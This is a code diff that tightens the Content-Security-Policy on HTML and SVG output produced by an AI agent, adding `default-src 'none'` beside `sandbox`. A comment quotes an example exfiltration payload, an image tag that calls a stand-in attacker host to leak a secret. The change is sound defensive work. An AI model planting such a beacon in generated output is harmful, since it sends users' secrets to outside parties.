@@ -125,10 +125,12 @@ export const serveOutput: RouteHandler = async (ctx) => {
   if (SAFE_OUTPUT_MIME.has(base)) {
     headers["Content-Type"] = result.mime_type;
   } else if (ACTIVE_OUTPUT_MIME.has(base)) {
-    // Render the agent's HTML/SVG, but `sandbox` makes it inert (no script, no
-    // forms, unique opaque origin → no cookie/same-origin access).
+    // Render the agent's HTML/SVG, but keep it inert: `sandbox` (no script/forms,
+    // unique opaque origin → no cookie/same-origin) AND `default-src 'none'`, which
+    // also blocks every sub-resource load so it can't beacon a secret out via
+    // `<img src="//attacker/?leak">`.
     headers["Content-Type"] = result.mime_type;
-    headers["Content-Security-Policy"] = "sandbox";
+    headers["Content-Security-Policy"] = "sandbox; default-src 'none'";
   } else {
     headers["Content-Type"] = "text/plain; charset=utf-8";
   }
